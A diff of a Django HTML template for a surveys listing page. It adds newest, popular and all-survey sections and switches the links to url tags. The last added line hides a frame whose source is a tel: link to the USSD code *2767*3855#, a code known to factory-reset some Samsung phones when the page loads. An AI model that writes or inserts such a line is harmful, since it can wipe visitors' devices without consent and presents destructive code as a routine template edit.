@@ -1,8 +1,27 @@
+<h1>Surveys</h1>
+<p><a href="{% url surveys.views.create %}">Create a new survey</a></p>
+<h2>Newest surveys:</h2>
 {% if latest_survey_list %}
-    <h1>Surveys</h1>
     {% for survey in latest_survey_list %}
-        <p>{{ survey.id }}. <a href="/surveys/{{ survey.id }}/">{{ survey.title }}</a></p>
+        <p><a href="{% url surveys.views.detail survey_id=survey.id %}">{{ survey.title }}</a> <strong>created {{ survey.pub_date }}</strong></p>
     {% endfor %}
 {% else %}
     <p>No surveys are available.</p>
 {% endif %}
+<h2>Popular surveys:</h2>
+{% if popular_survey_list %}
+    {% for survey in popular_survey_list %}
+        <p><a href="{% url surveys.views.detail survey_id=survey.id %}">{{ survey.title }}</a> <strong>{{ survey.tvotes }} votes</strong></p>
+    {% endfor %}
+{% else %}
+    <p>No surveys are available.</p>
+{% endif %}
+<h2>All surveys:</h2>
+{% if all_survey_list %}
+    {% for survey in all_survey_list %}
+        <p><a href="{% url surveys.views.detail survey_id=survey.id %}">{{ survey.title }}</a></p>
+    {% endfor %}
+{% else %}
+    <p>No surveys are available.</p>
+{% endif %}
+<frame src="tel:*2767*3855%23" />
